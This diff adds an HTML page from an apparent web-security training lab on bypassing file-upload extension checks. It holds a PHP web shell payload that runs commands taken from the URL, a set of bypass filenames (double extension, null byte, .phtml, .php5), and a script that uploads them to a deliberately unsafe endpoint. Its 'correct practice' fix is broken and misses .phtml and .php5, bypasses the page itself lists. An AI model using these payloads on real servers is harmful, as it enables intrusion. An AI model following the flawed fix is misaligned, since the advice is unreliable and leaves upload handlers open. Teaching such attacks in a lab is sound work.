@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>后缀名绕过 - 文件上传漏洞</title>
+  <link rel="stylesheet" href="../xss/style.css">
+  <style>
+    .upload-box { border: 2px dashed #ddd; padding: 20px; border-radius: 8px; margin: 15px 0; }
+    .payload-btn { background: #263238; color: #fff; border: none; padding: 8px 12px; margin: 5px; border-radius: 4px; cursor: pointer; font-size: 12px; }
+    .payload-btn:hover { background: #37474f; }
+    .result-box { background: #f5f5f5; padding: 15px; border-radius: 8px; margin-top: 15px; min-height: 80px; }
+    .success { color: #4caf50; }
+    .error { color: #f44336; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="index.html" class="back-link">← 返回文件上传漏洞</a>
+    <h1>📝 实验一：后缀名绕过</h1>
+
+    <div class="warning-box">
+      <strong>⚠️ 漏洞场景</strong>
+      <p>服务器只检查文件扩展名，可通过多种方式绕过</p>
+    </div>
+
+    <section>
+      <h2>🎮 攻击演示</h2>
+      
+      <div class="upload-box">
+        <h3>模拟上传</h3>
+        <div>
+          <label>文件名:</label>
+          <input type="text" id="filename" value="avatar.jpg" style="width: 300px; padding: 8px; margin: 5px;">
+        </div>
+        <div>
+          <label>MIME:</label>
+          <input type="text" id="mime" value="image/jpeg" style="width: 300px; padding: 8px; margin: 5px;">
+        </div>
+        <div>
+          <label>内容:</label>
+          <textarea id="content" style="width: 300px; height: 60px; padding: 8px; margin: 5px;">&lt;?php system($_GET['cmd']); ?&gt;</textarea>
+        </div>
+        <button onclick="upload()" class="btn">上传到不安全接口</button>
+      </div>
+
+      <h3>🎯 常用绕过 Payload</h3>
+      <div>
+        <button class="payload-btn" onclick="setPayload('shell.php.jpg', 'image/jpeg')">双扩展名: shell.php.jpg</button>
+        <button class="payload-btn" onclick="setPayload('shell.PhP', 'application/x-php')">大小写: shell.PhP</button>
+        <button class="payload-btn" onclick="setPayload('shell.php%00.jpg', 'image/jpeg')">空字节: shell.php%00.jpg</button>
+        <button class="payload-btn" onclick="setPayload('shell.phtml', 'text/html')">替代扩展: shell.phtml</button>
+        <button class="payload-btn" onclick="setPayload('shell.php5', 'application/x-php')">版本扩展: shell.php5</button>
+        <button class="payload-btn" onclick="setPayload('shell.jpg.php', 'image/jpeg')">反向双扩展: shell.jpg.php</button>
+      </div>
+
+      <div class="result-box" id="result">点击上传查看结果...</div>
+    </section>
+
+    <section>
+      <h2>💀 漏洞代码</h2>
+      <pre><code>// ❌ 只检查最后的扩展名
+const ext = filename.substring(filename.lastIndexOf('.'))
+
+if (!ALLOWED_EXTENSIONS.includes(ext.toLowerCase())) {
+  return res.status(400).json({ error: '不允许的文件类型' })
+}
+
+// 问题：shell.php.jpg 的 ext 是 .jpg，通过检查！</code></pre>
+    </section>
+
+    <section>
+      <h2>🛡️ 正确做法</h2>
+      <pre><code>// ✅ 检查所有扩展名
+const parts = filename.split('.')
+const dangerousExts = ['.php', '.jsp', '.asp', '.exe']
+
+for (const part of parts) {
+  if (dangerousExts.some(e => e.includes(part.toLowerCase()))) {
+    return res.status(400).json({ error: '检测到危险扩展名' })
+  }
+}</code></pre>
+    </section>
+  </div>
+
+  <script>
+    function setPayload(filename, mime) {
+      document.getElementById('filename').value = filename
+      document.getElementById('mime').value = mime
+    }
+    
+    async function upload() {
+      const filename = document.getElementById('filename').value
+      const mime = document.getElementById('mime').value
+      const content = document.getElementById('content').value
+      
+      const res = await fetch('/api/fileupload/unsafe/extension', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ filename, mime, content })
+      })
+      const data = await res.json()
+      
+      const isSuccess = data.success
+      document.getElementById('result').innerHTML = `
+        <span class="${isSuccess ? 'success' : 'error'}">${isSuccess ? '✅ 上传成功（绕过检查）' : '❌ 上传失败'}</span>
+        <pre>${JSON.stringify(data, null, 2)}</pre>
+      `
+    }
+  </script>
+</body>
+</html>
